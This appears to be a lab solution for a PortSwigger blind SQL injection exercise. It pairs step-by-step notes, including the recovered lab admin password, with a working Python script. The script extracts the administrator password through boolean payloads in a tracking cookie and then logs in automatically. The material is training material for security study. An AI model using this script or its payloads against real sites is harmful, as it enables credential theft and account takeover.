'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

1. Vulnerability:  Tracking Cookie (Blind SQLi)

2. Goal: 1. Enumerate the Administrator's Password
         2. Log in the administrator Account

3 Analysis: 1. Confirming the parameter is vulnerable
            * Backend Query: SELECT trackingid from trackingtable where trackignid = '<id>'
                - If Tracking ID Exists then table will return "Welcome Back Message"
                - If Tracking ID doesn't Exists then we will not get a "Welcome Back ID!"
                - Checking USE Case    
                    + Positive USE Case:         
                        (' AND 1=1--) # Gets Message for True Statement
                    - Negative USE Case: 
                        (' AND 1=0--) # Gets NO Message

            2. Confirming teh Database:
                
                
                Oracle 	SELECT banner FROM v$version
                            SELECT version FROM v$instance
                Microsoft 	SELECT @@version
                PostgreSQL 	SELECT version()
                MySQL 	SELECT @@version 

            3. Confirming if teh User table Exists
                [' AND (SELECT 'x' FROM users LIMIT 1)='x'--] #Confirmed users Table Exits!

            4. Confirm the username administrator exits
                [' AND (SELECT username FROM users where username = 'administrator' LIMIT 1)='administrator'--] #Confirmed username administrator exists!

            5. Confirming the length of the administrator's Password:
                [' AND (SELECT LENGTH(password) FROM USERS where username = 'administrator')=20--]  # Password Length is 20

            6. Enumerating the administrator password character by character

                [' AND (SELECT SUBSTRING(password, 1, 1)FROM USERS where username = 'administrator')='m'--)]  # First Character is 'm'

                Similarly making the whole password: 
                    
                    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
                    m u v 5 q x q v s  q  e  h  p  k  b  r  e  w  9  r

                    muv5qxqvsqehpkbrew9r

                
            
4. Exploit: ;)



Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-11/sqli-lab-11.py

'''


import sys
import requests
import urllib3
import urllib
from bs4 import BeautifulSoup  # Ensure you have BeautifulSoup installed

# Disable warnings for insecure requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set up proxy for HTTP requests (if needed)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# Helper function to send the payload and return the response
def send_payload(url, cookies):
    try:
        response = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    except:
        # If there's an issue with the proxy, send the request without it
        response = requests.get(url, cookies=cookies, verify=False)
    return response

# Function to extract the administrator's password using SQL injection
def extract_admin_password(url, tracking_id, session_id):
    password_extracted = ""  # Initialize an empty string to store the extracted password
    
    # Loop through the length of the password (assumed to be 20 characters)
    for char_position in range(1, 21):
        for ascii_value in range(32, 126):  # Loop through possible ASCII values for characters
            # Construct the SQL injection payload to retrieve the character at the current position
            sql_injection_payload = "' AND (SELECT ASCII(SUBSTRING(password, %s, 1)) FROM users WHERE username='administrator')='%s'--" % (char_position, ascii_value)
            payload_encoded = urllib.parse.quote(sql_injection_payload)  # URL encode the payload
            
            # Set cookies with the dynamically retrieved tracking ID and session ID
            cookies = {
                'TrackingId': tracking_id + payload_encoded, 
                'session': session_id
            }
            
            # Send the request with the constructed cookies
            response = send_payload(url, cookies)
            
            # Check if the response does not contain the welcome message
            if "Welcome" not in response.text:
                # If no welcome message, print the current progress
                sys.stdout.write('\r' + password_extracted + chr(ascii_value))
                sys.stdout.flush()  # Flush the output to update the display
            else:
                # If welcome message is found, add the character to the extracted password
                password_extracted += chr(ascii_value)
                sys.stdout.write('\r' + password_extracted)  # Display the current password
                sys.stdout.flush()
            
            # If the password length reaches 20, display the complete password and attempt to log in
            if len(password_extracted) == 20:
                print(f"\n[+] The administrator password is: {password_extracted}")
                # Attempt to log in as the administrator
                if login_as_admin(requests.Session(), url + "/login", password_extracted):
                    print("[+] SQL injection successful! Logged in as Administrator :)")
                else:
                    print("[-] SQL injection unsuccessful!")    
                return  # Exit the function once the password is found

    # If the process fails, indicate failure to retrieve credentials
    print("[-] Failed to retrieve administrator credentials.")

# Function to get the initial cookie values (TrackingId and session)
def get_initial_cookies(url):
    try:
        response = requests.get(url, verify=False, proxies=proxies)
    except:
        response = requests.get(url, verify=False)
    
    # Extract cookies from the response
    tracking_id = response.cookies.get('TrackingId', '')
    session_id = response.cookies.get('session', '')

    # Check if cookies were retrieved successfully
    if not tracking_id or not session_id:
        print("[-] Failed to retrieve cookies from the target website.")
        sys.exit(1)  # Exit if cookies are not found

    return tracking_id, session_id

# Function to get CSRF token from the login page
def get_csrf_token(session, url):
    try:
        response = session.get(url, verify=False, proxies=proxies)
    except: 
        response = session.get(url, verify=False)

    # Parse the response to find the CSRF token
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find("input")['value']
    return csrf_token

# Function to log in as the administrator using the extracted password
def login_as_admin(session, url_login, admin_password):
    csrf_token = get_csrf_token(session, url_login)  # Get CSRF token
    login_data = {
        "csrf": csrf_token,
        "username": "administrator",
        "password": admin_password
    }
    
    try:
        # Send a POST request to log in
        response = session.post(url_login, data=login_data, verify=False, proxies=proxies)
    except:
        response = session.post(url_login, data=login_data, verify=False)

    # Check if login was successful by looking for the logout message
    if "Log out" in response.text:
        return True  # Return true if logged in successfully
    else:
        return False  # Return false if login failed

# Main function to execute the SQL injection attack
def main(): 
    try:
        url = sys.argv[1]
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        # Edit The url
        url = 'https://0a1e00f2039c3dc182c3332f00e700fb.web-security-academy.net'  # Update Domain here  
    
    print("(+) Retrieving initial cookies from the website...")
    tracking_id, session_id = get_initial_cookies(url)  # Retrieve the cookies dynamically

    print("(+) Retrieving administrator password...")
    extract_admin_password(url, tracking_id, session_id)  # Start the password extraction process

# Run the main function when the script is executed
if __name__ == "__main__":
    main()

